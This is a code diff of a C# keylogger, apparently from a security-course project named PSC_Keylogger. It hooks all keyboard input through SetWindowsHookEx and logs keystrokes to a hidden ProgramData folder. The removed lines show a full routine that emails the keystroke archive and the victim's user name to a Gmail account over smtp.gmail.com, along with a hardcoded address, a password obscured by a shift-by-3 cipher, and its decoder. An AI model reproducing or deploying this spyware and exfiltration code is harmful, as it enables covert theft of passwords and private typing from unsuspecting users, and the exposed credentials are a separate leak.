@@ -14,13 +14,9 @@ namespace PSC_Keylogger
 {
     public static class BaseKeylogger
     {
-        private const string FROM_EMAIL_ADDRESS = "protocoalesecuritate01@gmail.com";
-        private const string FROM_EMAIL_PASSWORD = "surwrfrdohghvhfxulwdwhlqfrpxqlfdwll";
-        private const string TO_EMAIL_ADDRESS = "protocoalesecuritate01@gmail.com";
-
-        private const string LOG_FILE_NAME = @"C:\ProgramData\Z_PSC\mylog.txt";
-        private const string ARCHIVE_FILE_NAME = @"C:\ProgramData\Z_PSC\mylog_archive.txt";
-        private const bool INCLUDE_LOG_AS_ATTACHMENT = true;
+        public const string DIRECTORY_FILE_NAME = @"C:\ProgramData\Z_PSC";
+        public static string LOG_FILE_NAME = $@"{DIRECTORY_FILE_NAME}\mylog.txt";
+        public static string ARCHIVE_FILE_NAME = $@"{DIRECTORY_FILE_NAME}\mylog_archive.txt";
 
         private const int MAX_LOG_LENGTH_BEFORE_SENDING_EMAIL = 50;
         private const int MAX_KEYSTROKES_BEFORE_WRITING_TO_LOG = 0;
@@ -55,7 +51,7 @@ namespace PSC_Keylogger
 
                     logFile.Delete();
 
-                    System.Threading.Thread mailThread = new System.Threading.Thread(sendMail);
+                    System.Threading.Thread mailThread = new System.Threading.Thread(GmailManager.SendMail);
                     mailThread.Start();
                 }
                 catch (Exception e)
@@ -79,8 +75,7 @@ namespace PSC_Keylogger
                     case "Space":
                         buffer += " ";
                         break;
-                    case "Enter":
-                    case "Return":
+                    case "Enter": case "Return":
                         buffer += "\n";
                         break;
                     case "LShiftKey": case "RShiftKey":
@@ -106,65 +101,6 @@ namespace PSC_Keylogger
             return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, moduleHandle, 0);
         }
 
-        private static void sendMail()
-        {
-            try
-            {
-                StreamReader input = new StreamReader(ARCHIVE_FILE_NAME);
-                string emailBody = input.ReadToEnd();
-                input.Close();
-
-                SmtpClient client = new SmtpClient("smtp.gmail.com")
-                {
-                    Port = 587,
-                    DeliveryMethod = SmtpDeliveryMethod.Network,
-                    UseDefaultCredentials = false,
-                    Credentials = new NetworkCredential(FROM_EMAIL_ADDRESS, DecryptPassword()),
-                    EnableSsl = true,
-                };
-
-                MailMessage message = new MailMessage
-                {
-                    From = new MailAddress(FROM_EMAIL_ADDRESS),
-                    Subject = Environment.UserName + " - " + DateTime.Now.Month + "." + DateTime.Now.Day + "." + DateTime.Now.Year,
-                    Body = emailBody,
-                    IsBodyHtml = false,
-                };
-
-                if (INCLUDE_LOG_AS_ATTACHMENT)
-                {
-                    Attachment attachment = new Attachment(ARCHIVE_FILE_NAME, System.Net.Mime.MediaTypeNames.Text.Plain);
-                    message.Attachments.Add(attachment);
-                }
-
-                message.To.Add(TO_EMAIL_ADDRESS);
-
-                client.Send(message);
-
-                message.Dispose();
-            }
-            catch (Exception e)
-            {
-                Console.Out.WriteLine(e.Message);
-            }
-        }
-
-        private static string DecryptPassword()
-        {
-            byte[] values = Encoding.ASCII.GetBytes(FROM_EMAIL_PASSWORD);
-            byte[] newValues = new byte[values.Length];
-
-            int index = 0;
-            foreach (byte b in values)
-            {
-                int newValue = b - 3;
-                newValues[index] = (byte)newValue;
-                index += 1;
-            }
-
-            string actualPass = Encoding.ASCII.GetString(newValues);
-            return actualPass;
-        }
 
         [DllImport("user32.dll")]
         private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
